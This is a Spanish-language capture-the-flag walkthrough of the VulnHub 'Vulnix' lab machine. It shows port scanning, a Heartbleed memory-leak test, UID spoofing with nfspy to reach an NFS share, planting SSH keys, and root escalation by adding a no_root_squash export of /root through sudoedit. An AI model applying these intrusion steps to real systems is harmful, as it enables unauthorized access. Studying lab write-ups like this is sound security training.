# VULNIX
Desarrollo del CTF VULNIX
Download: https://www.vulnhub.com/entry/hacklab-vulnix,48/

## Escaneo de Puertos

### 1. Escaneamos todos los puertos TCP
- Muchos puertos abiertos en el servidor. Mucho por enumerar.

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.78.143
Nmap scan report for 192.168.78.143
Host is up (0.0010s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: 2021-03-02T04:37:14+00:00; -12h13m11s from scanner time.
79/tcp    open  finger     Debian fingerd
| finger: Login     Name       Tty      Idle  Login Time   Office     Office Phone\x0D
|_root      root      *pts/0      22  Mar  2 04:14 (192.168.78.131)\x0D
110/tcp   open  pop3       Dovecot pop3d
|_pop3-capabilities: UIDL SASL PIPELINING TOP RESP-CODES CAPA STLS
|_ssl-date: 2021-03-02T04:37:14+00:00; -12h13m11s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      36906/tcp6  mountd
|   100005  1,2,3      45339/udp   mountd
|   100005  1,2,3      49916/tcp   mountd
|   100005  1,2,3      60784/udp6  mountd
|   100021  1,3,4      33884/udp   nlockmgr
|   100021  1,3,4      47178/udp6  nlockmgr
|   100021  1,3,4      47973/tcp   nlockmgr
|   100021  1,3,4      48450/tcp6  nlockmgr
|   100024  1          44751/tcp   status
|   100024  1          54059/udp6  status
|   100024  1          56207/tcp6  status
|   100024  1          59215/udp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_imap-capabilities: more have SASL-IR IMAP4rev1 OK ID LITERAL+ LOGIN-REFERRALS STARTTLS post-login capabilities listed Pre-login ENABLE LOGINDISABLEDA0001 IDLE
|_ssl-date: 2021-03-02T04:37:14+00:00; -12h13m11s from scanner time.
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imaps?
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2021-03-02T04:37:15+00:00; -12h13m11s from scanner time.
995/tcp   open  ssl/pop3s?
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2021-03-02T04:37:15+00:00; -12h13m11s from scanner time.
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
35728/tcp open  mountd     1-3 (RPC #100005)
44751/tcp open  status     1 (RPC #100024)
47973/tcp open  nlockmgr   1-4 (RPC #100021)
49916/tcp open  mountd     1-3 (RPC #100005)
58142/tcp open  mountd     1-3 (RPC #100005)
MAC Address: 00:0C:29:21:A2:F2 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enmumeración de Servicios

- Yo utilizo AUTORECON siempre. Me facilita la vida. El resultado del proceso arroja cosas interesantes.
- Se identificó: carpeta compartida por NFS y HEARTBLEED.

```
root@kali:~/VULNIX# showmount -e 192.168.78.143
Export list for 192.168.78.143:
/home/vulnix *

```

- La vulnerabilidad de HEARTBLEED esta en el puerto TCP/993 y TCP/995.
```
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 

```

## Explotando la Vulnerabilidad

### Exploté el HEARTBLEED en búsqueda de algo interesante pero NO.
- HB-TEST.PY: https://gist.github.com/harlo/10199638

```
root@kali:~/VULNIX# python hb-test.py 192.168.78.143 -p 995 | more
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 58
 ... received message: type = 22, ver = 0302, length = 921
 ... received message: type = 22, ver = 0302, length = 525
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
```

<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix1.jpg" width="80%"></img>


### Montando la carpeta NFS

- Un poco de teoría previa. Hay dos opciones de seguridad que se debe conocer en NFS:

> root_squash: Esta opción permite que loa archivos se ejecuten con usuario que NOBODY, es decir no se crean ni ejecutan como ROOT.
Es una opción de seguridad que no permite que se monte la unidad de manera directa, se debe tener un usuario con las mismas características en el sistema para montar la unidad.

> no_root_squash: Esta opción permite que se creen los usuarios con el usuario del cliente de conexión. Haciendo vulnerable la carpeta compartida. No se recomienda nunca usar esta opción.


- Al montar la unidad podemos concluir que tiene la opción de seguridad ROOT_SQUASH

```
root@kali:~/VULNIX# umount /mnt/share/
umount: /mnt/share/: not mounted.
root@kali:~/VULNIX# showmount -e 192.168.78.143
Export list for 192.168.78.143:
/home/vulnix *
root@kali:~/VULNIX# mount -t nfs 192.168.78.143:/home/vulnix /mnt/share/
root@kali:~/VULNIX# ls -la /mnt/share/
ls: cannot open directory '/mnt/share/': Permission denied
```

<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix2.jpg" width="80%"></img>

- Para tener permisos sobre la carpeta requerimos crear un USUARIO en el Sist. Operativo con el ID del usuario de la máquina VULNIX, es decir, KALI y VULNIX deben tener un usuario con el mismo ID, el problema es obvio. ¿Cuál es ese ID? 

- Existen dos maneras de poder obtener ese ID: 
> Adivinar por ensayo/error ese ID. Probar desde 1000 en adelante.
> Automatizar la búsqueda del ID. Para esto podemos crear un SCRIPT o utilizar uno que ya existe que se llama NFSPY.

https://github.com/bonsaiviking/NfSpy

```
root@kali:~/VULNIX/vulnix/192.168.78.143/scans# nfspysh -o server=192.168.78.143:/home/vulnix
nfspy@192.168.78.143:/home/vulnix:/> ls
/:
040700   2008   2008        4096 2021-03-01 16:12:21 .cache
040750   2008   2008        4096 2021-03-01 21:22:42 .
100644   2008   2008         220 2012-04-03 11:58:14 .bash_logout
104777      0      0     1037528 2021-03-01 21:22:42 bash
100644   2008   2008         675 2012-04-03 11:58:14 .profile
100600   2008   2008         360 2021-03-01 21:29:53 .bash_history
040750   2008   2008        4096 2021-03-01 21:22:42 ..
100644   2008   2008        3486 2012-04-03 11:58:14 .bashrc

```

<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix3.jpg" width="80%"></img>

- Podemos ver que el ID del usuario es 2008. Como ejercicio alternativo podriamos crear el usuario y analizar el mismo comportamiento.

```
root@kali:/mnt# useradd vulnix -u 2008
root@kali:/tmp# su vulnix
$ cd /mnt/share
$ ls -la
total 1056
drwxr-x--- 4 nobody 4294967294    4096 Mar  1 22:51 .
drwxr-xr-x 3 root   root          4096 Mar  1 19:12 ..
-rwsrwxrwx 1 root   root       1037528 Mar  1 21:22 bash
-rw------- 1 nobody 4294967294     360 Mar  1 21:29 .bash_history
-rw-r--r-- 1 nobody 4294967294     220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 nobody 4294967294    3486 Apr  3  2012 .bashrc
drwx------ 2 nobody 4294967294    4096 Mar  1 16:12 .cache
-rw-r--r-- 1 nobody 4294967294       8 Mar  1 17:06 nfs.txt
-rw-r--r-- 1 nobody 4294967294    2486 Mar  1 22:51 omar.txt
-rw-r--r-- 1 nobody 4294967294     675 Apr  3  2012 .profile
drwxr-xr-x 2 nobody 4294967294    4096 Mar  1 16:11 .ssh

```

### Copiando llaves SSH para establecer la conexión

> Aquí toca saber la teoría de las llaves SSH y como utilizarlas para no requerir credenciales. En resumen debemos realizar lo siguiente:

```
En KALI Linux:

root@kali:/mnt# ssh-keygen 
root@kali:/# cp /root/.ssh/id_rsa.pub /tmp/authorized_keys
root@kali:/# chown vulnix:vulnix /tmp/authorized_keys
```

- A través del acceso a NFS que obtuvimos cargamos la llave pública SSH.
- Importante: Tienes que conocer la teoría detrás de las llaves SSH, sino te pierdes.

```
nfspy@192.168.78.143:/home/vulnix:/> ls
/:
040700   2008   2008        4096 2021-03-01 16:12:21 .cache
040750   2008   2008        4096 2021-03-01 23:03:26 .
100644   2008   2008           8 2021-03-01 17:06:05 nfs.txt
100644   2008   2008         220 2012-04-03 11:58:14 .bash_logout
100644   2008   2008        2486 2021-03-01 22:51:31 omar.txt
100644   2008   2008         675 2012-04-03 11:58:14 .profile
100600   2008   2008         360 2021-03-01 21:29:53 .bash_history
040750   2008   2008        4096 2021-03-01 23:03:26 ..
100644   2008   2008        3486 2012-04-03 11:58:14 .bashrc
nfspy@192.168.78.143:/home/vulnix:/> mkdir .ssh
nfspy@192.168.78.143:/home/vulnix:/> cd .ssh                      
nfspy@192.168.78.143:/home/vulnix:/.ssh> put /tmp/authorized_keys  
nfspy@192.168.78.143:/home/vulnix:/.ssh> ls  
/.ssh:
040755   2008   2008        4096 2021-03-01 23:04:19 .
100644   2008   2008         563 2021-03-01 23:04:19 authorized_keys
040750   2008   2008        4096 2021-03-01 23:03:52 ..
```

<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix4.jpg" width="80%"></img>

### Estableciendo conexión SSH:

<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix5.jpg" width="80%"></img>


## Elevar Privilegios

- Una vez que estamos dentro con el usuario VULNIX, toca buscar a través de todas las técnicas como elevar privilegios.
- El mecanismo esta vez parece ser sencillo, a través de SUDO podemos elevar privilegios:

```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

- Por casualidades de la vida (clásico de un CTF) podemos editar el archivo EXPORTS para compartir archivos por NFS.
- Lo más lógico me parece repetir el proceso anterior, es decir, compartir la carpeta /root, subir las llaves SSH y listo. Veamos que pasa.


### Editamos el archivo EXPORTS

```
vulnix@vulnix:~$ sudoedit /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
/root           *(rw,no_root_squash)
```

- Nótese que estoy añadiendo "no_root_squash" esto para no tener que adivinar el ID del usuario y poder montar directamente con permisos del usuario root.
- Debemos reiniciar el servicio para que los cambios sean efectivos. Busqué miles de formas, sin éxito. Toca reiniciar manualmente el servidor. Ni modo.

<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix6.jpg" width="80%"></img>


- Repetimos el mismo proceso de copiar las llaves públicas en el usuario ROOT y nos conectamos.

```
root@kali:/tmp# showmount -e 192.168.78.143
Export list for 192.168.78.143:
/root        *
/home/vulnix *

root@kali:/tmp# mount -t nfs 192.168.78.143:/root /mnt/share/
root@kali:/mnt/share# mkdir .ssh
root@kali:/mnt/share# cp /tmp/authorized_keys .ssh/
root@kali:/mnt/share# chmod 600 .ssh/authorized_keys 
root@kali:/home# ssh root@192.168.78.143
```
<img src="https://github.com/El-Palomo/VULNIX/blob/main/vulnix7.jpg" width="80%"></img>



e



